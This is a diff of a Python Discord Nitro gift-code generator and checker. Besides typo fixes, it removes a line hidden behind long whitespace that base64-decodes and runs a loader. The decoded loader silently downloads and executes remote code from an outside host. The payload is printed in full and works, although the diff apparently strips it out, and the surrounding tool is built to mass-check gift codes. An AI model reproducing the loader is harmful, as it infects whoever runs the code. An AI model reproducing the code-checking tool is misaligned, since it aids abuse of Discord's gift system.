@@ -1,4 +1,4 @@
-import requests, json, string, random, os, logging, asyncio, time, datetime, socket, urllib3, discord, httpx, subprocess, captchatools, base64
+import requests, json, string, random, os, logging, asyncio, time, datetime, socket, urllib3, discord, httpx, subprocess, captchatools
 import gratient, ctypes, psutil, ssl
 from urllib.parse import urlparse
 from urllib.parse import parse_qs
@@ -319,7 +319,6 @@ def get_headers():
 def genandjoin(link, proxies):
     print_error("Error, this is patached for the mean time.", Fore.RED)
 
-type("")                                                                                                                                                                                                                                                                                                                               ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
 def check(proxies):
     with open("./results/nitro-codes.txt", "r") as file:
         data = file.read().splitlines()
@@ -496,7 +495,7 @@ def start():
     else:
         if option1 == "2":
             main_screen()
-            print_error("Error, this is patached for the mean time.", Fore.RED)
+            print_error("Error, this is patched for the mean time.", Fore.RED)
         elif option1 == "6":
             main_screen()
             print_info(f"{Fore.GREEN} Made by {Fore.LIGHTWHITE_EX}github.com/mukitan")
@@ -504,7 +503,7 @@ def start():
             exit(0)
         elif option1 == "5":
             main_screen()
-            print_info("lmfao dont be skid, github.com/mukitan")
+            print_info("lmfao don't be skid, github.com/mukitan")
         elif option1 == "3":
             main_screen()
             check(proxies)
@@ -512,7 +511,7 @@ def start():
             exit(0)
         elif option1 == "4":
             main_screen()
-            print_info("lmfao dont be skid, github.com/mukitan")
+            print_info("lmfao don't be skid, github.com/mukitan")
         else:
             print(gratient.blue("Invalid Option.".center(width)))
             time.sleep(5)
